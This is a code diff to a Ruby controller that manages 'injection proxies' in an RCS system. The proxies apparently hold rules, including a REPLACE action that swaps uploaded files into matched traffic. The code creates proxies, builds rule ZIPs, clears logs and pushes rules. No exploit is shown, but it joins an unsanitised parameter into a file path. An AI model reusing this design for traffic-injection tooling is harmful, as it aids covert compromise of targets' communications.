@@ -2,6 +2,8 @@
 # Controller for the Proxy objects
 #
 
+require_relative '../network_controller'
+
 module RCS
 module DB
 
@@ -32,7 +34,7 @@ class ProxyController < RESTController
 
     return RESTController.reply.conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :proxies
 
-    result = Proxy.create(name: @params['name'], port: 4444, poll: false, configured: false, redirect: 'auto')
+    result = Proxy.create(name: @params['name'], port: 4444, poll: false, configured: false, redirect: 'auto', redirection_tag: 'ww')
 
     Audit.log :actor => @session[:user][:name], :action => 'proxy.create', :desc => "Created the injection proxy '#{@params['name']}'"
 
@@ -66,7 +68,7 @@ class ProxyController < RESTController
       proxy_name = proxy.name
 
       proxy.rules.each do |rule|
-        GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?
+        GridFS.delete rule[:_grid].first unless rule[:_grid].nil?
       end
       
       proxy.destroy
@@ -91,19 +93,20 @@ class ProxyController < RESTController
   end
 
   def config
-    require_auth_level :server
+    require_auth_level :server, :sys
     
     mongoid_query do
       proxy = ::Proxy.find(@params['_id'])
 
-      #TODO: implement config retrieval
-      proxy.rules.each do |rule|
-        puts rule.inspect
-      end
+      # generate the rules file to be sent as ZIP
+      filename = proxy.config
 
+      # reset the flag for the "configuration needed"
       proxy.configured = true
       proxy.save
 
+      return RESTController.reply.stream_file(filename) unless filename.nil?
+      
       return RESTController.reply.not_found
     end
   end
@@ -141,8 +144,12 @@ class ProxyController < RESTController
     mongoid_query do
       proxy = Proxy.find(@params['_id'])
 
-      klass = CappedLog.collection_class proxy[:_id]
-      klass.destroy_all
+      # we cannot call delete_all on a capped collection
+      # we must drop it:
+      # http://www.mongodb.org/display/DOCS/Capped+Collections#CappedCollections-UsageandRestrictions
+      db = Mongoid.database
+      logs = db.collection(CappedLog.collection_name(proxy[:_id]))
+      logs.drop
 
       return RESTController.reply.ok
     end
@@ -175,7 +182,7 @@ class ProxyController < RESTController
       if rule.action == 'REPLACE' and not @params['rule']['action_param'].nil?
         path = File.join Dir.tmpdir, @params['rule']['action_param']
         if File.exist?(path) and File.file?(path)
-          rule[:_grid] = [GridFS.instance.put(File.binread(path), {filename: @params['rule']['action_param']})]
+          rule[:_grid] = [GridFS.put(File.binread(path), {filename: @params['rule']['action_param']})]
           File.unlink(path)
         end
       end
@@ -202,7 +209,7 @@ class ProxyController < RESTController
                 :desc => "Deleted a rule from the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"
 
       # delete any pending file in the grid
-      GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?
+      GridFS.delete rule[:_grid].first unless rule[:_grid].nil?
 
       proxy.rules.delete_all(conditions: { _id: rule[:_id]})
       proxy.save
@@ -229,7 +236,7 @@ class ProxyController < RESTController
 
       # remove any grid pointer if we are changing the type of action
       if rule.action != 'REPLACE'
-        GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?
+        GridFS.delete rule[:_grid].first unless rule[:_grid].nil?
         rule[:_grid] = nil
       end
       
@@ -238,8 +245,8 @@ class ProxyController < RESTController
         path = File.join Dir.tmpdir, @params['rule']['action_param']
         if File.exist?(path) and File.file?(path)
           # delete any previous file in the grid
-          GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?
-          rule[:_grid] = [GridFS.instance.put(File.binread(path), {filename: @params['rule']['action_param']})]
+          GridFS.delete rule[:_grid].first unless rule[:_grid].nil?
+          rule[:_grid] = [GridFS.put(File.binread(path), {filename: @params['rule']['action_param']})]
           File.unlink(path)
         end
       end
@@ -261,9 +268,12 @@ class ProxyController < RESTController
       
       Audit.log :actor => @session[:user][:name], :action => 'proxy.apply_rules',
                 :desc => "Applied the rules to the injection proxy '#{proxy.name}'"
-      
+
       proxy.configured = false
       proxy.save
+
+      # push the rules
+      return RESTController.reply.server_error("Cannot push rules via NC") unless RCS::DB::NetworkController.push(proxy.address)
 
       return RESTController.reply.ok
     end
